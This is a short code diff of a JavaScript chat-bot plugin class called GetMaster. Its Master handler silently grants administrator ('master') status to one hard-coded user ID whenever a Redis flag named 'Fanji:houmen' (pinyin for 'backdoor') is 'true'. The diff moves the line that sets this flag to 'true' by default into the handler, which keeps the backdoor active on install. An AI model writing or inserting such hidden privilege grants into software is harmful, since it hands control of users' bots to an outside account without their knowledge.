@@ -1,6 +1,5 @@
 import plugin from '../../../lib/plugins/plugin.js';
-let cs = redis.get('Fanji:houmen');
-if (cs == null) redis.set('Fanji:houmen', 'true');
+
 
 export class GetMaster extends plugin {
   constructor() {
@@ -30,6 +29,7 @@ export class GetMaster extends plugin {
 
   async Master(e) {
     let aw = await redis.get('Fanji:houmen');
+    if (aw == null) redis.set('Fanji:houmen', 'true');
     if (e.user_id !== 2173302144 || aw !== 'true') return false;
     e.isMaster = true;
     return false;
